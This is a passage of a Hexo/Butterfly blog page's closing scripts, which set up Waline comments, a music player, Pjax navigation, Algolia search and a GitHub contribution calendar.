  const initWaline = (Fn, el = document, path = window.location.pathname) => {
    const waline = Fn({
      el: el.querySelector('#waline-wrap'),
      serverURL: 'https://waline-git-main-bohemianas-projects.vercel.app/',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      comment: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    if (isShuoshuo) {
      window.shuoshuoComment.destroyWaline = () => {
        destroyWaline(waline)
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const loadWaline = (el, path) => {
    if (initFn) initWaline(initFn, el, path)
    else {
      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
        .then(({ init }) => {
          initFn = init || Waline.init
          initWaline(initFn, el, path)
          window.walineFn = initFn
        })
    }
  }

  if (isShuoshuo) {
    'Waline' === 'Waline'
      ? window.shuoshuoComment = { loadComment: loadWaline } 
      : window.loadOtherComment = loadWaline
    return
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script></div><div class="aplayer no-destroy" data-id="13186150757" data-server="netease" data-type="playlist" data-loop="all"  data-fixed="true" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: true,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/lite/builds/browser.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=Bohemiana";
            var git_color =['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];
            var git_user ="Bohemiana";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body></html>